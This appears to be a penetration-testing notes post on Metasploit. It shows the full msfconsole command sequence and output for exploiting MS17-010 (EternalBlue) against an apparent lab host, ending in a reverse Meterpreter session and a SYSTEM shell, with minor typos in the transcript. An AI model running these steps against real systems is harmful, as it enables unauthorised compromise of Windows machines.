---
title: Metasploit
date: 2024-10-22 01:59
categories:
  - Penetration Testing
tags:
  - Offensive
  - Security
  - Website
  - Tools
render_with_liquid: false
---
The Metasploit Framework (MSF) contains many built-in exploits for many public vulnerabilities and provides an easy way to use these exploits against vulnerable targets. MSF has many other features, like:
- Running reconnaissance scripts to enumerate remote hosts and compromised targets
- Verification scripts to test the existence of a vulnerability without actually compromising the target
- Meterpreter, which is a great tool to connect to shells and run commands on the compromised targets
- Many post-exploitation and pivoting tools

To run `Metasploit`, we can use the `msfconsole` command. Search for our target application with the `search exploit` command

```shell-session
mssf6 > search exploit eternalblue

Matching Modules
================

   #  Name                         Disclosure Date  Rank     Check  Description
   -  ----                         ---------------  ----     -----  -----------
<SNIP>
EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/../smb/ms17_010_psexec   2017-03-14  normal   Yes    MS17-010 
```

> [!Tip]
> Tip: Search can apply complex filters such as search cve:2009 type:exploit. See all the filters with help search

Copy the full name of it and using `USE` to use it
```shell-session
msf6 > use exploit/windows/smb/ms17_010_psexec

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```

Configure its options before running the exploit. To view the options available to configure, we can use the `show options` command:

```shell-session
Module options (exploit/windows/smb/ms17_010_psexec):

   Name       Current Setting    Required  Description
   ----       ---------------    --------  -----------
   DBGTRACE            false      yes       Show extra debug trace info
   LEAKATTEMPTS        99         yes       Total try to leak transaction
   RHOSTS                         yes       The target host(s), range CIDR, ...
   RPORT               445        yes       The Target port (TCP)
   SERVICE_NAME                    no       The service name
   SHARE              ADMIN$      yes       The share to connect to ...
...SNIP...
```

Option with `Required` set to `yes` needs to be set for the exploit to work. In this case, we only have two options to set: `RHOSTS` which is IP of our target (one IP, multiple IPs, or a file containing a list of IPs). 

The second option, `LHOST`, represents the IP of our attack host (this can be a single IP, or the name of a network interface. In the example below, `LHOST` is being set to the IP associated with our `tun0` interface.) We can set them with the `set` command:

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
LHOST => tun0
```

Run a check to ensure the server is vulnerable:

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > check

[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445 - Host is likely VULNERABLE to MS17-010! - ...
[*] 10.10.10.40:445 - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.40:445 - The target is vulnerable.
```

Finally, use the `run` or `exploit` command to run the exploit:

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.2:4444 
[*] 10.10.10.40:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
[*] 10.10.10.40:445 - Built a write-what-where primitive...
[+] 10.10.10.40:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.10.10.40:445 - Selecting PowerShell target
[*] 10.10.10.40:445 - Executing the payload...
[+] 10.10.10.40:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.40:49159) at 2020-12-27 01:13:28 +0000

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > shell
Process 39640 created.
Channel 0 created.
Windows 7 Professional 7601 Service Pack 1
(C) Copyright 1985-2009 Microsoft Corp.

C:\WINDOWS\system32>whoami
NT AUTHORITY\SYSTEM
```

Admin access to the box can be gained through the `shell` command to drop an interactive shell.